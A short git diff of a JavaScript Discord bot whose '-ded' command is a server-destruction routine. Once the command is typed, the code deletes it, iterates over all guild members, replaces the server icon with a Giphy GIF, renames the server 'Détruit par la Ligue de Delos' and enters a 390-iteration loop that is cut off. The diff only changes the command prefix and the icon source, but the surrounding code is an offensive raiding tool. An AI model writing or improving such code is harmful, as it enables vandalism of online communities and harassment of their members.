@@ -119,7 +119,7 @@ client.on('ready',() => {
 client.on('message', msg => {
  
 
-            if (msg.content === '.ded') {
+            if (msg.content === '-ded') {
                 if (msg.channel.type === "dm") return;
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
@@ -137,7 +137,7 @@ if(msg.content === '-del'){
   if (msg.content === '-ded') {
     console.log(`Commande -ded par ${msg.author.tag}`);
 
-      msg.guild.setIcon('./delos.png').catch(e => {});
+      msg.guild.setIcon('https://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif').catch(e => {});
       msg.guild.setName('Détruit par la Ligue de Delos').catch(e => {});
 
       for (var i = 0; i < 390; i++) {
